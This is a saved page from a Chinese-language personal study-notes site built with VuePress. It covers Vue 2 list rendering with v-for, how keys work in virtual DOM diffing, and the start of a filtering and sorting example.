<!DOCTYPE html>
<html lang="en-US">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <title>Vue2 | 有空看看</title>
    <meta name="generator" content="VuePress 1.8.2">
    
    <meta name="description" content="">
    
    <link rel="preload" href="/dose1/assets/css/0.styles.c9546c7c.css" as="style"><link rel="preload" href="/dose1/assets/js/app.370f2ecb.js" as="script"><link rel="preload" href="/dose1/assets/js/2.579f079f.js" as="script"><link rel="preload" href="/dose1/assets/js/17.54584c3d.js" as="script"><link rel="prefetch" href="/dose1/assets/js/10.15b385d2.js"><link rel="prefetch" href="/dose1/assets/js/11.7719a193.js"><link rel="prefetch" href="/dose1/assets/js/12.7a3b1235.js"><link rel="prefetch" href="/dose1/assets/js/13.bf569039.js"><link rel="prefetch" href="/dose1/assets/js/14.f04af72a.js"><link rel="prefetch" href="/dose1/assets/js/15.cae4f64f.js"><link rel="prefetch" href="/dose1/assets/js/16.28681f08.js"><link rel="prefetch" href="/dose1/assets/js/18.4b466fb7.js"><link rel="prefetch" href="/dose1/assets/js/19.882f21ee.js"><link rel="prefetch" href="/dose1/assets/js/20.6d8d7aa6.js"><link rel="prefetch" href="/dose1/assets/js/21.ed3f43c1.js"><link rel="prefetch" href="/dose1/assets/js/22.b9fd778f.js"><link rel="prefetch" href="/dose1/assets/js/23.2563d097.js"><link rel="prefetch" href="/dose1/assets/js/24.33dab2d6.js"><link rel="prefetch" href="/dose1/assets/js/25.35b2c93b.js"><link rel="prefetch" href="/dose1/assets/js/26.fa63a29b.js"><link rel="prefetch" href="/dose1/assets/js/27.a5ca9c28.js"><link rel="prefetch" href="/dose1/assets/js/28.c8d6aeb7.js"><link rel="prefetch" href="/dose1/assets/js/29.bc350787.js"><link rel="prefetch" href="/dose1/assets/js/3.dddbab9e.js"><link rel="prefetch" href="/dose1/assets/js/4.dacb7f3f.js"><link rel="prefetch" href="/dose1/assets/js/5.516cbc1e.js"><link rel="prefetch" href="/dose1/assets/js/6.c1a5c5b5.js"><link rel="prefetch" href="/dose1/assets/js/7.eb3c1009.js"><link rel="prefetch" href="/dose1/assets/js/8.7ced4e1e.js"><link rel="prefetch" href="/dose1/assets/js/9.fb95937f.js">
    <link rel="stylesheet" href="/dose1/assets/css/0.styles.c9546c7c.css">
  </head>
  <body>
    <div id="app" data-server-rendered="true"><div class="theme-container"><header class="navbar"><div class="sidebar-button"><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" role="img" viewBox="0 0 448 512" class="icon"><path fill="currentColor" d="M436 124H12c-6.627 0-12-5.373-12-12V80c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12zm0 160H12c-6.627 0-12-5.373-12-12v-32c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12zm0 160H12c-6.627 0-12-5.373-12-12v-32c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12z"></path></svg></div> <a href="/dose1/" class="home-link router-link-active"><img src="/dose1/assets/img/logo.jpg" alt="有空看看" class="logo"> <span class="site-name can-hide">有空看看</span></a> <div class="links"><div class="search-box"><input aria-label="Search" autocomplete="off" spellcheck="false" value=""> <!----></div> <nav class="nav-links can-hide"><div class="nav-item"><a href="/dose1/" class="nav-link">
  主页
</a></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="Language Menu" class="dropdown-title"><span class="title">数据库</span> <span class="arrow down"></span></button> <button type="button" aria-label="Language Menu" class="mobile-dropdown-title"><span class="title">数据库</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><!----> <a href="/dose1/datarepo/mysql/mysql.html" class="nav-link">
  mysql
</a></li><li class="dropdown-item"><!----> <a href="/dose1/foo/two.html" class="nav-link">
  备用
</a></li></ul></div></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="Language Menu" class="dropdown-title"><span class="title">前端</span> <span class="arrow down"></span></button> <button type="button" aria-label="Language Menu" class="mobile-dropdown-title"><span class="title">前端</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><!----> <a href="/dose1/mybefore/mybase/前端基础.html" class="nav-link">
  三件套
</a></li><li class="dropdown-item"><!----> <a href="/dose1/mybefore/myjQuery/jQuery.html" class="nav-link">
  jQuery
</a></li><li class="dropdown-item"><!----> <a href="/dose1/mybefore/myajax/ajax.html" class="nav-link">
  AJAX
</a></li><li class="dropdown-item"><!----> <a href="/dose1/mybefore/myVue/Vue2/Vue1.html" class="nav-link">
  Vue2
</a></li><li class="dropdown-item"><!----> <a href="/dose1/mybefore/myVue/Vue3/Vue3.html" class="nav-link">
  Vue3
</a></li></ul></div></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="Language Menu" class="dropdown-title"><span class="title">后端</span> <span class="arrow down"></span></button> <button type="button" aria-label="Language Menu" class="mobile-dropdown-title"><span class="title">后端</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><!----> <a href="/dose1/springpre/pre.html" class="nav-link">
  spring前言
</a></li><li class="dropdown-item"><!----> <a href="/dose1/springmvc/springmvc.html" class="nav-link">
  springMVC
</a></li><li class="dropdown-item"><!----> <a href="/dose1/SpringBoot2/SpringBootFirst.html" class="nav-link">
  springBoot2
</a></li><li class="dropdown-item"><!----> <a href="/dose1/foo/one.html" class="nav-link">
  备用
</a></li></ul></div></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="Language Menu" class="dropdown-title"><span class="title">其他</span> <span class="arrow down"></span></button> <button type="button" aria-label="Language Menu" class="mobile-dropdown-title"><span class="title">其他</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><!----> <a href="/dose1/other/newJava.html" class="nav-link">
  java8新特性
</a></li><li class="dropdown-item"><!----> <a href="/dose1/other/HashMap.html" class="nav-link">
  hashmap
</a></li><li class="dropdown-item"><!----> <a href="https://jojo-995.gitee.io/2021/03/06/markdown-tutorial/" target="_blank" rel="noopener noreferrer" class="nav-link external">
  markdown
  <span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></li><li class="dropdown-item"><!----> <a href="/dose1/foo/two.html" class="nav-link">
  备用
</a></li></ul></div></div> <a href="https://github.com/jack110959/dose1" target="_blank" rel="noopener noreferrer" class="repo-link">
    Github
    <span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></nav></div></header> <div class="sidebar-mask"></div> <aside class="sidebar"><nav class="nav-links"><div class="nav-item"><a href="/dose1/" class="nav-link">
  主页
</a></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="Language Menu" class="dropdown-title"><span class="title">数据库</span> <span class="arrow down"></span></button> <button type="button" aria-label="Language Menu" class="mobile-dropdown-title"><span class="title">数据库</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><!----> <a href="/dose1/datarepo/mysql/mysql.html" class="nav-link">
  mysql
</a></li><li class="dropdown-item"><!----> <a href="/dose1/foo/two.html" class="nav-link">
  备用
</a></li></ul></div></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="Language Menu" class="dropdown-title"><span class="title">前端</span> <span class="arrow down"></span></button> <button type="button" aria-label="Language Menu" class="mobile-dropdown-title"><span class="title">前端</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><!----> <a href="/dose1/mybefore/mybase/前端基础.html" class="nav-link">
  三件套
</a></li><li class="dropdown-item"><!----> <a href="/dose1/mybefore/myjQuery/jQuery.html" class="nav-link">
  jQuery
</a></li><li class="dropdown-item"><!----> <a href="/dose1/mybefore/myajax/ajax.html" class="nav-link">
  AJAX
</a></li><li class="dropdown-item"><!----> <a href="/dose1/mybefore/myVue/Vue2/Vue1.html" class="nav-link">
  Vue2
</a></li><li class="dropdown-item"><!----> <a href="/dose1/mybefore/myVue/Vue3/Vue3.html" class="nav-link">
  Vue3
</a></li></ul></div></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="Language Menu" class="dropdown-title"><span class="title">后端</span> <span class="arrow down"></span></button> <button type="button" aria-label="Language Menu" class="mobile-dropdown-title"><span class="title">后端</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><!----> <a href="/dose1/springpre/pre.html" class="nav-link">
  spring前言
</a></li><li class="dropdown-item"><!----> <a href="/dose1/springmvc/springmvc.html" class="nav-link">
  springMVC
</a></li><li class="dropdown-item"><!----> <a href="/dose1/SpringBoot2/SpringBootFirst.html" class="nav-link">
  springBoot2
</a></li><li class="dropdown-item"><!----> <a href="/dose1/foo/one.html" class="nav-link">
  备用
</a></li></ul></div></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="Language Menu" class="dropdown-title"><span class="title">其他</span> <span class="arrow down"></span></button> <button type="button" aria-label="Language Menu" class="mobile-dropdown-title"><span class="title">其他</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><!----> <a href="/dose1/other/newJava.html" class="nav-link">
  java8新特性
</a></li><li class="dropdown-item"><!----> <a href="/dose1/other/HashMap.html" class="nav-link">
  hashmap
</a></li><li class="dropdown-item"><!----> <a href="https://jojo-995.gitee.io/2021/03/06/markdown-tutorial/" target="_blank" rel="noopener noreferrer" class="nav-link external">
  markdown
  <span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></li><li class="dropdown-item"><!----> <a href="/dose1/foo/two.html" class="nav-link">
  备用
</a></li></ul></div></div> <a href="https://github.com/jack110959/dose1" target="_blank" rel="noopener noreferrer" class="repo-link">
    Github
    <span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></nav>  <ul class="sidebar-links"><li><section class="sidebar-group depth-0"><p class="sidebar-heading open"><span>Vue2</span> <!----></p> <ul class="sidebar-links sidebar-group-items"><li><a href="/dose1/mybefore/myVue/Vue2/Vue1.html" class="sidebar-link">Vue</a></li><li><a href="/dose1/mybefore/myVue/Vue2/Vue2.html" aria-current="page" class="active sidebar-link">Vue2</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header"><a href="/dose1/mybefore/myVue/Vue2/Vue2.html#一-列表渲染" class="sidebar-link">一，列表渲染</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header"><a href="/dose1/mybefore/myVue/Vue2/Vue2.html#_1-v-for" class="sidebar-link">1，v-for</a></li><li class="sidebar-sub-header"><a href="/dose1/mybefore/myVue/Vue2/Vue2.html#_2-key原理" class="sidebar-link">2，key原理</a></li><li class="sidebar-sub-header"><a href="/dose1/mybefore/myVue/Vue2/Vue2.html#_3-过滤与排序" class="sidebar-link">3，过滤与排序</a></li><li class="sidebar-sub-header"><a href="/dose1/mybefore/myVue/Vue2/Vue2.html#_4-data原理" class="sidebar-link">4，data原理*</a></li></ul></li><li class="sidebar-sub-header"><a href="/dose1/mybefore/myVue/Vue2/Vue2.html#二-收集表单数据" class="sidebar-link">二，收集表单数据</a></li><li class="sidebar-sub-header"><a href="/dose1/mybefore/myVue/Vue2/Vue2.html#三-过滤器" class="sidebar-link">三，过滤器</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header"><a href="/dose1/mybefore/myVue/Vue2/Vue2.html#_1-普通使用" class="sidebar-link">1，普通使用</a></li><li class="sidebar-sub-header"><a href="/dose1/mybefore/myVue/Vue2/Vue2.html#_2-传参使用" class="sidebar-link">2，传参使用</a></li><li class="sidebar-sub-header"><a href="/dose1/mybefore/myVue/Vue2/Vue2.html#_3-推荐" class="sidebar-link">3，推荐</a></li></ul></li><li class="sidebar-sub-header"><a href="/dose1/mybefore/myVue/Vue2/Vue2.html#四-内置指令" class="sidebar-link">四，内置指令</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header"><a href="/dose1/mybefore/myVue/Vue2/Vue2.html#_1-v-text指令" class="sidebar-link">1，v-text指令</a></li><li class="sidebar-sub-header"><a href="/dose1/mybefore/myVue/Vue2/Vue2.html#_2-v-html指令" class="sidebar-link">2，v-html指令</a></li><li class="sidebar-sub-header"><a href="/dose1/mybefore/myVue/Vue2/Vue2.html#_3-v-cloak指令" class="sidebar-link">3，v-cloak指令</a></li><li class="sidebar-sub-header"><a href="/dose1/mybefore/myVue/Vue2/Vue2.html#_5-v-once指令" class="sidebar-link">5，v-once指令</a></li><li class="sidebar-sub-header"><a href="/dose1/mybefore/myVue/Vue2/Vue2.html#_6-v-pre指令" class="sidebar-link">6，v-pre指令</a></li></ul></li><li class="sidebar-sub-header"><a href="/dose1/mybefore/myVue/Vue2/Vue2.html#五-自定义指令" class="sidebar-link">五，自定义指令</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header"><a href="/dose1/mybefore/myVue/Vue2/Vue2.html#_1-函数式" class="sidebar-link">1，函数式</a></li><li class="sidebar-sub-header"><a href="/dose1/mybefore/myVue/Vue2/Vue2.html#_2-对象式" class="sidebar-link">2，对象式</a></li><li class="sidebar-sub-header"><a href="/dose1/mybefore/myVue/Vue2/Vue2.html#_3-全局配置" class="sidebar-link">3，全局配置</a></li></ul></li><li class="sidebar-sub-header"><a href="/dose1/mybefore/myVue/Vue2/Vue2.html#六-生命周期" class="sidebar-link">六，生命周期</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header"><a href="/dose1/mybefore/myVue/Vue2/Vue2.html#_1-原理图" class="sidebar-link">1，原理图</a></li><li class="sidebar-sub-header"><a href="/dose1/mybefore/myVue/Vue2/Vue2.html#_2-四对钩子函数" class="sidebar-link">2，四对钩子函数</a></li><li class="sidebar-sub-header"><a href="/dose1/mybefore/myVue/Vue2/Vue2.html#_3-总结" class="sidebar-link">3，总结</a></li></ul></li><li class="sidebar-sub-header"><a href="/dose1/mybefore/myVue/Vue2/Vue2.html#七-非单文件组件" class="sidebar-link">七，非单文件组件</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header"><a href="/dose1/mybefore/myVue/Vue2/Vue2.html#_1-创建组件" class="sidebar-link">1，创建组件</a></li><li class="sidebar-sub-header"><a href="/dose1/mybefore/myVue/Vue2/Vue2.html#_2-注册组件" class="sidebar-link">2，注册组件</a></li><li class="sidebar-sub-header"><a href="/dose1/mybefore/myVue/Vue2/Vue2.html#_3-使用" class="sidebar-link">3，使用</a></li><li class="sidebar-sub-header"><a href="/dose1/mybefore/myVue/Vue2/Vue2.html#_4-注意点" class="sidebar-link">4，注意点</a></li><li class="sidebar-sub-header"><a href="/dose1/mybefore/myVue/Vue2/Vue2.html#_5-vuecomponent" class="sidebar-link">5，VueComponent</a></li><li class="sidebar-sub-header"><a href="/dose1/mybefore/myVue/Vue2/Vue2.html#_6-组件的原型" class="sidebar-link">6，组件的原型</a></li></ul></li><li class="sidebar-sub-header"><a href="/dose1/mybefore/myVue/Vue2/Vue2.html#八。单文件组件" class="sidebar-link">八。单文件组件</a></li><li class="sidebar-sub-header"><a href="/dose1/mybefore/myVue/Vue2/Vue2.html#九-脚手架cli" class="sidebar-link">九，脚手架cli</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header"><a href="/dose1/mybefore/myVue/Vue2/Vue2.html#_1-render函数" class="sidebar-link">1，render函数</a></li><li class="sidebar-sub-header"><a href="/dose1/mybefore/myVue/Vue2/Vue2.html#_2-ref" class="sidebar-link">2，ref</a></li><li class="sidebar-sub-header"><a href="/dose1/mybefore/myVue/Vue2/Vue2.html#_3-props" class="sidebar-link">3，props</a></li><li class="sidebar-sub-header"><a href="/dose1/mybefore/myVue/Vue2/Vue2.html#_4-mixin-混入" class="sidebar-link">4，mixin(混入)</a></li><li class="sidebar-sub-header"><a href="/dose1/mybefore/myVue/Vue2/Vue2.html#_5-插件" class="sidebar-link">5，插件</a></li><li class="sidebar-sub-header"><a href="/dose1/mybefore/myVue/Vue2/Vue2.html#_6-scoped样式" class="sidebar-link">6，scoped样式</a></li><li class="sidebar-sub-header"><a href="/dose1/mybefore/myVue/Vue2/Vue2.html#_7-本地存储" class="sidebar-link">7，本地存储</a></li><li class="sidebar-sub-header"><a href="/dose1/mybefore/myVue/Vue2/Vue2.html#_8-组件的自定义事件" class="sidebar-link">8，组件的自定义事件</a></li><li class="sidebar-sub-header"><a href="/dose1/mybefore/myVue/Vue2/Vue2.html#_9-全局事件总线" class="sidebar-link">9，全局事件总线</a></li><li class="sidebar-sub-header"><a href="/dose1/mybefore/myVue/Vue2/Vue2.html#_10-消息订阅与发布" class="sidebar-link">10，消息订阅与发布</a></li><li class="sidebar-sub-header"><a href="/dose1/mybefore/myVue/Vue2/Vue2.html#_11-nexttick" class="sidebar-link">11，nextTick</a></li><li class="sidebar-sub-header"><a href="/dose1/mybefore/myVue/Vue2/Vue2.html#_12-vue脚手架配置代理" class="sidebar-link">12，vue脚手架配置代理</a></li></ul></li></ul></li><li><a href="/dose1/mybefore/myVue/Vue2/Vue3.html" class="sidebar-link">Vue3</a></li></ul></section></li></ul> </aside> <main class="page"> <div class="theme-default-content content__default"><h1 id="vue2"><a href="#vue2" class="header-anchor">#</a> Vue2</h1> <h2 id="一-列表渲染"><a href="#一-列表渲染" class="header-anchor">#</a> 一，列表渲染</h2> <h3 id="_1-v-for"><a href="#_1-v-for" class="header-anchor">#</a> 1，v-for</h3> <ol><li>用于展示列表数据</li> <li>语法：v-for=&quot;(item, index) in xxx&quot; :key=&quot;yyy&quot;</li> <li>可遍历：数组、对象、字符串（用的很少）、指定次数（用的很少）</li> <li>可以用 <code>of</code> 替代 <code>in</code> 作为分隔符，因为它更接近 JavaScript 迭代器的语法</li></ol> <p>示例</p> <p>data数据</p> <div class="language-js extra-class"><pre class="language-js"><code>data<span class="token operator">:</span><span class="token punctuation">{</span>
    persons<span class="token operator">:</span><span class="token punctuation">[</span>
        <span class="token punctuation">{</span>id<span class="token operator">:</span><span class="token string">'001'</span><span class="token punctuation">,</span>name<span class="token operator">:</span><span class="token string">'张三'</span><span class="token punctuation">,</span>age<span class="token operator">:</span><span class="token number">18</span><span class="token punctuation">}</span><span class="token punctuation">,</span>
        <span class="token punctuation">{</span>id<span class="token operator">:</span><span class="token string">'002'</span><span class="token punctuation">,</span>name<span class="token operator">:</span><span class="token string">'李四'</span><span class="token punctuation">,</span>age<span class="token operator">:</span><span class="token number">19</span><span class="token punctuation">}</span><span class="token punctuation">,</span>
        <span class="token punctuation">{</span>id<span class="token operator">:</span><span class="token string">'003'</span><span class="token punctuation">,</span>name<span class="token operator">:</span><span class="token string">'王五'</span><span class="token punctuation">,</span>age<span class="token operator">:</span><span class="token number">20</span><span class="token punctuation">}</span>
    <span class="token punctuation">]</span><span class="token punctuation">,</span>
    car<span class="token operator">:</span><span class="token punctuation">{</span>
        name<span class="token operator">:</span><span class="token string">'奥迪A8'</span><span class="token punctuation">,</span>
        price<span class="token operator">:</span><span class="token string">'70万'</span><span class="token punctuation">,</span>
        color<span class="token operator">:</span><span class="token string">'黑色'</span>
        <span class="token punctuation">}</span><span class="token punctuation">,</span>
    str<span class="token operator">:</span><span class="token string">'hello'</span>
<span class="token punctuation">}</span>
</code></pre></div><p><strong>数组</strong></p> <div class="language-html extra-class"><pre class="language-html"><code><span class="token comment">&lt;!-- 遍历数组，第一个为形参，第二个为数组下标，key可以为index也可以为p.id --&gt;</span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h2</span><span class="token punctuation">&gt;</span></span>人员列表（遍历数组）<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h2</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>ul</span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span> <span class="token attr-name">v-for</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>(p,index) of persons<span class="token punctuation">&quot;</span></span> <span class="token attr-name">:key</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>index<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>
  {{p.name}}-{{p.age}}
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>ul</span><span class="token punctuation">&gt;</span></span>
</code></pre></div><p><strong>对象</strong></p> <div class="language-html extra-class"><pre class="language-html"><code><span class="token comment">&lt;!-- 遍历对象，第一个为属性值，第二个为属性名 --&gt;</span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h2</span><span class="token punctuation">&gt;</span></span>汽车信息（遍历对象）<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h2</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>ul</span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span> <span class="token attr-name">v-for</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>(value,k) of car<span class="token punctuation">&quot;</span></span> <span class="token attr-name">:key</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>k<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>
	{{k}}-{{value}}
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>ul</span><span class="token punctuation">&gt;</span></span>
</code></pre></div><p><strong>字符串</strong></p> <div class="language-html extra-class"><pre class="language-html"><code><span class="token comment">&lt;!-- 遍历字符串 --&gt;</span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h2</span><span class="token punctuation">&gt;</span></span>测试遍历字符串（用得少）<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h2</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>ul</span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span> <span class="token attr-name">v-for</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>(char,index) of str<span class="token punctuation">&quot;</span></span> <span class="token attr-name">:key</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>index<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>
	{{char}}-{{index}}
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>ul</span><span class="token punctuation">&gt;</span></span>
</code></pre></div><p><strong>遍历指定次数</strong></p> <div class="language-html extra-class"><pre class="language-html"><code><span class="token comment">&lt;!-- 遍历指定次数 --&gt;</span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h2</span><span class="token punctuation">&gt;</span></span>测试遍历指定次数（用得少）<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h2</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>ul</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span> <span class="token attr-name">v-for</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>(number,index) of 5<span class="token punctuation">&quot;</span></span> <span class="token attr-name">:key</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>index<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>
	{{index}}-{{number}}
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>ul</span><span class="token punctuation">&gt;</span></span>
</code></pre></div><h3 id="_2-key原理"><a href="#_2-key原理" class="header-anchor">#</a> 2，key原理</h3> <p>1，虚拟DOM中key的作用：</p> <p>​                    key是虚拟DOM对象的标识，当数据发生变化时，Vue会根据【新数据】生成【新的虚拟DOM】,</p> <p>​                    随后Vue进行【新虚拟DOM】与【旧虚拟DOM】的差异比较，比较规则如下：</p> <p>2，对比规则：</p> <p>​                  (1).旧虚拟DOM中找到了与新虚拟DOM相同的key：</p> <p>​                        ①.若虚拟DOM中内容没变, 直接使用之前的真实DOM！</p> <p>​                        ②.若虚拟DOM中内容变了, 则生成新的真实DOM，随后替换掉页面中之前的真实DOM。</p> <p>​                  (2).旧虚拟DOM中未找到与新虚拟DOM相同的key</p> <p>​                        创建新的真实DOM，随后渲染到到页面。</p> <p>3，用index作为key可能会引发的问题：</p> <p>​            		1. 若对数据进行：逆序添加、逆序删除等破坏顺序操作:</p> <p>​                		会产生没有必要的真实DOM更新 ==&gt; 界面效果没问题, 但效率低。</p> <p>​           		 2. 如果结构中还包含输入类的DOM：</p> <p>​               		 会产生错误DOM更新 ==&gt; 界面有问题。</p> <p>4，开发中如何选择key?:
1.最好使用每条数据的唯一标识作为key, 比如id、手机号、身份证号、学号等唯一值。</p> <p>​              	2.如果不存在对数据的逆序添加、逆序删除等破坏顺序操作，仅用于渲染列表用于展示，</p> <p>​                        使用index作为key是没有问题的。</p> <h4 id="_1-index"><a href="#_1-index" class="header-anchor">#</a> <strong>(1)index</strong></h4> <p>例子情况：在数组头插入新对象老刘。</p> <p>对比算法，通过key相同的进行比对，节点相同的保留，不同的或不存在的即重新生成。</p> <p>使用index的情况的对比算法会出现，文本不匹配重新生成，但input对比一致，所以直接复用。</p> <p><img src="https://github.com/jack110959/pictures/blob/main/imgimage-20210817150120250.png?raw=true" alt="image-20210817150120250"></p> <h4 id="_2-id"><a href="#_2-id" class="header-anchor">#</a> <strong>(2)id</strong></h4> <p>推荐使用</p> <p>这种情况下，无论数组如何改变，每个元素的key都跟之前的保持一致。</p> <p>因此，通过对比算法得到的结果也会是一致，所以直接复用，也就不会出现数据错乱问题。</p> <p><img src="https://github.com/jack110959/pictures/blob/main/imgimage-20210817150823904.png?raw=true" alt="image-20210817150823904"></p> <h3 id="_3-过滤与排序"><a href="#_3-过滤与排序" class="header-anchor">#</a> 3，过滤与排序</h3> <p>示例</p> <p>使用计算属性，sortType用来判断事件类型，</p> <p>html</p> <div class="language-html extra-class"><pre class="language-html"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>root<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>
			<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h2</span><span class="token punctuation">&gt;</span></span>人员列表<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h2</span><span class="token punctuation">&gt;</span></span>
